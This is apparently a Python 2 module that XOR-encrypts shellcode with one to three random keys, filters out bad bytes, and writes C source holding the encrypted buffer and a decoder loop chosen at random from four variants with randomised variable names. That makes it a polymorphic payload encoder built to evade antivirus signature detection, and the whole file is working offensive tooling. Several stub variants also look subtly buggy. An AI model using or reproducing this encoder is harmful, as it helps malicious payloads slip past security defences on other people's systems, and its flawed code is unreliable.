import os,sys
import binascii
import random,string

def varname_creator():
    varname = ""
    Adam = random.randint(4,8)
    Eve = random.randint(12,16)
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(Adam,Eve)))
    return varname
     
def xor_encryption(data,key):
    flag = 0
    shellcode = ""
    keyarray=bytearray(key)
    data_array=bytearray(data)
    for b in data_array:
        if flag == len(key)-1:
            shellcode += bytearray([b^keyarray[flag] ]) 
            flag = 0
        else: 
            shellcode += bytearray([b^keyarray[flag] ])
            flag += 1
        
    return shellcode

def bad_char_inspector(data):
    bad_char_detected=False
    data=str(data)
    for i in range(0,len(data)):
        if ord(data[i]) == 0:
            bad_char_detected=True
        if ord(data[i]) == 10:
            bad_char_detected=True
        if ord(data[i]) == 13:
            bad_char_detected=True

    return bad_char_detected

def key_gen(keysize):
    key=os.urandom(keysize)
    check_bad_key=True
    check_bad_key=bad_char_inspector(key)
    while check_bad_key == True:
        key=os.urandom(keysize)
        check_bad_key=bad_char_inspector(key)
    return key

def baddoublekey(key1,key2):
    check_badchar=True
    st_step = xor_encryption(key1,key2)
    check_badchar=bad_char_inspector(st_step)
    if check_badchar == False:
        return False
    else:
        return True


def badtriplekey(key,key2,key3):
    check_badchar1=True
    st_step = xor_encryption(key,key2)
    check_badchar1=bad_char_inspector(st_step)
    if check_badchar1 == False:

        check_badchar2=True
        nd_step = xor_encryption(st_step,key3)
        check_badchar2=bad_char_inspector(nd_step)

        if check_badchar2 == False:

            return False

        else:

            return True
    else:

        return True

def Xor_stub2(shellcode,bufname):
    keysize=random.randint(12,24)
    key=key_gen(keysize)

    encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),key)
    check_bad_char=True
    check_bad_char=bad_char_inspector(encrypted_shellcode)

    while check_bad_char == True:
        key=key_gen(keysize)
        encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),key)
        check_bad_char=bad_char_inspector(encrypted_shellcode)

    encrypted_shellcode= binascii.hexlify(encrypted_shellcode)

    printable_shellcode = ""
    for i in range(0,len(encrypted_shellcode)-1,2):
        printable_shellcode += "\\x" + encrypted_shellcode[i] + encrypted_shellcode [i+1]

    key = binascii.hexlify(key)
    printable_key = ""
    for i in range(0,len(key)-1,2):
        
        printable_key += "\\x" + key[i] + key[i+1]

    Randflag1 = varname_creator()
    Randflag2 = varname_creator()
    keyname = varname_creator()

    Encoded_buffer = "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"

    Xor_stub = ""

    StubSelect=random.randint(1,4)

    if StubSelect == 1:


        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"

    if StubSelect == 2:


        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"

    if StubSelect == 3:

        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " +=1;}\n"

    if StubSelect == 4:

        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " +=1;}\n"              
    
    return (Encoded_buffer,Xor_stub)

def Doublexor_stub2(shellcode,bufname):
    keysize1=random.randint(12,24)
    keysize2=random.randint(12,24)
    key1=key_gen(keysize1)
    key2=key_gen(keysize2)
    badkeys=True

    badkeys=baddoublekey(key1,key2)

    while badkeys == True:
        key1=key_gen(keysize1)
        key2=key_gen(keysize2)
        badkeys=baddoublekey(key1,key2)
    
    Realkey=xor_encryption(key1,key2)

    encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),Realkey)
    check_bad_char=True
    check_bad_char=bad_char_inspector(encrypted_shellcode)

    while check_bad_char == True:
        badkeys=True
        key1=key_gen(keysize1)
        key2=key_gen(keysize2)
        badkeys=baddoublekey(key1,key2)

        while badkeys == True:
            key1=key_gen(keysize1)
            key2=key_gen(keysize2)
            badkeys=baddoublekey(key1,key2)

            Realkey=xor_encryption(key1,key2)

        encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),Realkey)
        check_bad_char=bad_char_inspector(encrypted_shellcode)

    encrypted_shellcode= binascii.hexlify(encrypted_shellcode)

    printable_shellcode = ""
    for i in range(0,len(encrypted_shellcode)-1,2):
        printable_shellcode += "\\x" + encrypted_shellcode[i] + encrypted_shellcode [i+1]

    key1 = binascii.hexlify(key1)
    printable_key1 = ""
    for i in range(0,len(key1)-1,2):
        
        printable_key1 += "\\x" + key1[i] + key1[i+1]

    key2 = binascii.hexlify(key2)
    printable_key2 = ""
    for i in range(0,len(key2)-1,2):
        
        printable_key2 += "\\x" + key2[i] + key2[i+1]


    Randflag1 = varname_creator()
    Randflag2 = varname_creator()
    Randflag4 = varname_creator()
    keyname1 = varname_creator()
    keyname2 = varname_creator()
    keynamestep1 = varname_creator()
    keynamestep2 = varname_creator()


    Encoded_buffer = "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"

    Xor_stub = ""

    StubSelect=random.randint(1,4)

    if StubSelect == 1:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"  

    if StubSelect == 2:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 

    if StubSelect == 3:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"   

    if StubSelect == 4:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"    
    
    return (Encoded_buffer,Xor_stub)

def Triplexor_stub2(shellcode,bufname):
    keysize1=random.randint(12,24)
    keysize2=random.randint(12,24)
    keysize3=random.randint(12,24)
    key1=key_gen(keysize1)
    key2=key_gen(keysize2)
    key3=key_gen(keysize3)
    badkeys=True

    badkeys=badtriplekey(key1,key2,key3)

    while badkeys == True:
        key1=key_gen(keysize1)
        key2=key_gen(keysize2)
        key3=key_gen(keysize3)
        badkeys=badtriplekey(key1,key2,key3)
    
    Realkey=xor_encryption(key1,key2)
    
    Realkey=xor_encryption(Realkey,key3)


    encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),Realkey)
    check_bad_char=True
    check_bad_char=bad_char_inspector(encrypted_shellcode)

    while check_bad_char == True:
        badkeys=True
        key1=key_gen(keysize1)
        key2=key_gen(keysize2)
        key3=key_gen(keysize3)
        badkeys=badtriplekey(key1,key2,key3)

        while badkeys == True:
            key1=key_gen(keysize1)
            key2=key_gen(keysize2)
            key3=key_gen(keysize3)
            badkeys=badtriplekey(key1,key2,key3)

            Realkey=xor_encryption(key1,key2)
    
            Realkey=xor_encryption(Realkey,key3)

        encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),Realkey)
        check_bad_char=bad_char_inspector(encrypted_shellcode)

    encrypted_shellcode= binascii.hexlify(encrypted_shellcode)

    printable_shellcode = ""
    for i in range(0,len(encrypted_shellcode)-1,2):
        printable_shellcode += "\\x" + encrypted_shellcode[i] + encrypted_shellcode [i+1]

    key1 = binascii.hexlify(key1)
    printable_key1 = ""
    for i in range(0,len(key1)-1,2):
        
        printable_key1 += "\\x" + key1[i] + key1[i+1]

    key2 = binascii.hexlify(key2)
    printable_key2 = ""
    for i in range(0,len(key2)-1,2):
        
        printable_key2 += "\\x" + key2[i] + key2[i+1]

    key3 = binascii.hexlify(key3)
    printable_key3 = ""
    for i in range(0,len(key3)-1,2):
        
        printable_key3 += "\\x" + key3[i] + key3[i+1]


    Randflag1 = varname_creator()
    Randflag2 = varname_creator()
    Randflag3 = varname_creator()
    Randflag4 = varname_creator()
    keyname1 = varname_creator()
    keyname2 = varname_creator()
    keyname3 = varname_creator()
    keynamestep1 = varname_creator()
    keynamestep2 = varname_creator()

    Encoded_buffer = "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"

    Xor_stub = ""

    StubSelect=random.randint(1,4)

    if StubSelect == 1:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += Randflag3 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"

    if StubSelect == 2:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key3 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
        Xor_stub += Randflag3 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 

    if StubSelect == 3:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += Randflag3 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"

    if StubSelect == 4:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
        Xor_stub += Randflag3 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"

 
    
    return (Encoded_buffer,Xor_stub)
